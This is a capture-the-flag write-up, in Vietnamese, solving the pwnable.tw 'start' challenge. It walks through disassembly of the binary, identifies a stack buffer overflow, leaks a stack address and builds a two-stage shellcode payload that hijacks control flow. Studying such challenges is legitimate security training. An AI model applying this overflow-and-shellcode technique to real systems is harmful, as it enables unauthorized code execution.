# Start
## Description

Just a start.

nc chall.pwnable.tw 10000

[start](https://pwnable.tw/static/chall/start)

## Resolution

thực hiện việc kiểm tra file binary

```
$ file start 
start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
```

```
[*] '/home/ctf/pwnable/pwnable.tw/start/start'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```

```
start:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:	54                   	push   esp
 8048061:	68 9d 80 04 08       	push   0x804809d
 8048066:	31 c0                	xor    eax,eax
 8048068:	31 db                	xor    ebx,ebx
 804806a:	31 c9                	xor    ecx,ecx
 804806c:	31 d2                	xor    edx,edx
 804806e:	68 43 54 46 3a       	push   0x3a465443
 8048073:	68 74 68 65 20       	push   0x20656874
 8048078:	68 61 72 74 20       	push   0x20747261
 804807d:	68 73 20 73 74       	push   0x74732073
 8048082:	68 4c 65 74 27       	push   0x2774654c
 8048087:	89 e1                	mov    ecx,esp
 8048089:	b2 14                	mov    dl,0x14
 804808b:	b3 01                	mov    bl,0x1
 804808d:	b0 04                	mov    al,0x4
 804808f:	cd 80                	int    0x80
 8048091:	31 db                	xor    ebx,ebx
 8048093:	b2 3c                	mov    dl,0x3c
 8048095:	b0 03                	mov    al,0x3
 8048097:	cd 80                	int    0x80
 8048099:	83 c4 14             	add    esp,0x14
 804809c:	c3                   	ret    

0804809d <_exit>:
 804809d:	5c                   	pop    esp
 804809e:	31 c0                	xor    eax,eax
 80480a0:	40                   	inc    eax
 80480a1:	cd 80                	int    0x80
```

như chúng ta thấy bin chỉ có cỏn vẹn 2 hàm code là `_start` và `_exit`

bây giờ chúng ta tìm hiểu luồn thực thi của bin

```
 8048060:	54                   	push   esp
 8048061:	68 9d 80 04 08       	push   0x804809d
 8048066:	31 c0                	xor    eax,eax
 8048068:	31 db                	xor    ebx,ebx
 804806a:	31 c9                	xor    ecx,ecx
 804806c:	31 d2                	xor    edx,edx
 804806e:	68 43 54 46 3a       	push   0x3a465443
 8048073:	68 74 68 65 20       	push   0x20656874
 8048078:	68 61 72 74 20       	push   0x20747261
 804807d:	68 73 20 73 74       	push   0x74732073
 8048082:	68 4c 65 74 27       	push   0x2774654c
```

đầu tiên chương trình sẽ push các giá trị `esp`, `0x804809d` (addr của `_exit`) vào stack

null hết các thanh ghi eax, ebx, ecx, edx

push các giá trị **`CTF:`**, **`the `**, **`art `**, **`s st`**, **`Let'`**

```
 8048087:	89 e1                	mov    ecx,esp
 8048089:	b2 14                	mov    dl,0x14
 804808b:	b3 01                	mov    bl,0x1
 804808d:	b0 04                	mov    al,0x4
 804808f:	cd 80                	int    0x80
 8048091:	31 db                	xor    ebx,ebx
 8048093:	b2 3c                	mov    dl,0x3c
 8048095:	b0 03                	mov    al,0x3
 8048097:	cd 80                	int    0x80
 8048099:	83 c4 14             	add    esp,0x14
 804809c:	c3                   	ret    
 ```

 tiếp theo chương trình sẽ thực hiện ngắt 80 dựa theo các giá trị được pass vào thanh ghi

- ecx == giá trị của **`Let'`**
- edx == 0x14 
- ebx == 0x1
- eax == 0x4

dựa theo [bảng syscall](https://syscalls.kernelgrok.com/) thì chương trình sẽ thực hiện `sys_write` rồi sau đó sẽ thực hiện `sys_read` đọc input 0x3c ký tự. 

read input xong sẽ tăng giá trị của esp lên thành esp + 0x14 (20 in dec), lúc này giá trị của esp chính là addr của `_exit`

<img src= "https://i.imgur.com/LzN9VvA.png">

như vậy chúng ta có thể thấy được lỗi ở đây là read input tới 0x3c kí tự dẫn đến BOF, với offset là 0x14 chúng ta có thể control được flow của bin

test

<img src="https://imgur.com/r5yHgSQ.png">

như chúng ta đã check file thì bit NX không được bật nên ta có thể gửi shellcode vào để thực thi

nhưng trước khi gửi được shellcode thì ta phải chú ý đoạn này

```
 8048060:	54                   	push   esp
```

ở đầu chương trình chúng ta có đẩy giá trị esp vào thì nếu ta control eip trỏ lại addr `0x8048087` thì ta có thể leak được giá trị này. vậy payload đầu tiên sẽ là

`'a'*0x14 + p32(0x8048087)`

tại sao chúng ta lại cần giá trị này? vì giá trị này sẽ trỏ vào vị trí chúng ta chứa shellcode trên stack

như vậy payload thứ 2 của ta sẽ là 

`'a'*0x14 + p32(leaked) + shellcode`

<img src="https://imgur.com/2OJlSiL.png">

<img src="https://imgur.com/uZm1hzm.png">